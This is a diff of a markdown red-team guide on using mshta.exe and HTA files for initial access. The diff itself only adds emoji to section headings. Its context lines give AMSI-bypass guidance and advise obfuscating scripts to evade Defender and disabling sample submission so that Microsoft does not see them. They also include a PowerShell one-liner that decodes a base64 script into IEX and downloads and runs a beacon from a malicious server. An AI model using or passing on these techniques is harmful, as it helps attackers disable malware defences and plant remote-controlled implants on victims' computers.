@@ -1,7 +1,7 @@
 # Gaining initial access with HTA
 Instruction on gaining initial access using mshta.exe to execute HTA files
 
-## 1. Overview
+## 1. 📚 Overview
 **Basic HTA Payload**
 ```html
 <html>
@@ -29,10 +29,10 @@ Although HTA attacks have been around for a while they are still a solid **STAGI
 
 ---
 
-## 2. Crafting AMSI patching script
+## 2. 🍳 Crafting AMSI patching script
 The operator has a couple of options to kill AMSI. The laziest option is to generate the script from [amsi.fail](https://amsi.fail/) collection. This script generator uses random trechniques from a collection of scripts. Although amsi.fail generates unique signatues at runtime for each payload they are sometimes snagged by AV. Test the payload in your lab to make sure you are successfully pathcing AMSI before serving it to your target.
 
-NOTE: It is important to **DISABLE Automatic Sample Submission** while experimenting in you lab. You DO NOT WANT your scripts to be sent to Microsoft sandboxes for further analysis.
+⚠️ NOTE: It is important to **DISABLE Automatic Sample Submission** while experimenting in you lab. You DO NOT WANT your scripts to be sent to Microsoft sandboxes for further analysis.
 
 The other options to patch AMSI are shown below. The powershell snippets can be tweaked and modified in order to execute and kill AMSI. Remember to use obfuscation techniques to evade defender for the scripts below.
 - **Memory Patching (In-Memory AMSI Bypass)**
@@ -95,7 +95,7 @@ A fairly simple way to chain the commands is to embed the Cobalt Strike web-scri
 [sYStEm.tEXt.enCOdIng]::unICOdE.GetsTrIng([SystEm.conVERT]::fRoMBaSe64string("base64 encode script here")) | IEX; IEX (curl 'http://malicious-server.com/beacon')
 ```
 
-## 3. Weaponizing the HTA
+## 3. ☣️ Weaponizing the HTA
 
 Once you have a script that will patch AMSI it is time to weaponize the HTA payload:
 
